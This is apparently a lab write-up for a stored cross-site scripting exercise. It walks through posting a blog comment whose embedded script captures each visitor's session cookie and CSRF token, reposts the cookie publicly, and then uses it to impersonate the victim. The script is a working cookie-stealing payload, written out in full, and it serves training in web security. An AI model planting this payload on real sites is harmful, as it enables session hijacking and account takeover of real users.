## Solution steps

- Open any blog post and write a comment to trigger an alert with random name and email.
- Notice that you can trigger an alert easily with this kind of payload: `<script>alert(1)</script>`
- But in this lab we have to steal victim's session cookie, then use this cookie to impersonate the victim.

- This Lab has 2 solutions, one using Burp Collaborator and another without using Burp Collaborator. I will explain the steps without using burp collaborator as I don't have the premium version. But I will paste the another solution at the bottom from their official solution for your and my convenience :)

### Without using Burp Collaborator

- This solution is considered less subtle because this will make the victim to post their session cookie as a comment and every user visiting the page will be able to see it.
- Open Burp suite and set-up proxy (Keep intercept off).
- Post a random comment.
- From Http history, view `POST /post/comment` and notice that the request contains your session cookie and a `csrf` parameter.
- Copy the following payload and paste it as comment with random name and email:
  ```html
  <script>
  window.addEventListener('DOMContentLoaded', function(){

  var token = document.getElementsByName('csrf')[0].value;
  var data = new FormData();

  data.append('csrf', token);
  data.append('postId', 5);
  data.append('comment', document.cookie);
  data.append('name', 'chris');
  data.append('email', 'chris@01.com');
  data.append('website', 'http://www.chris.com');

  fetch('/post/comment', {
	  method: 'POST',
	  mode: 'no-cors',
	  body: data
  });
  });
  </script>
- Note: Change the `postId` parameter according to the post where you're commenting.
- Go back to the post and view that the session cookie and a secret is posted.
- Copy the session cookie, inspect the page using Ctrl+shift+c and go to application tab.
- Go to cookies and change the session cookie's value with the victim's cookie and hit Enter.
  
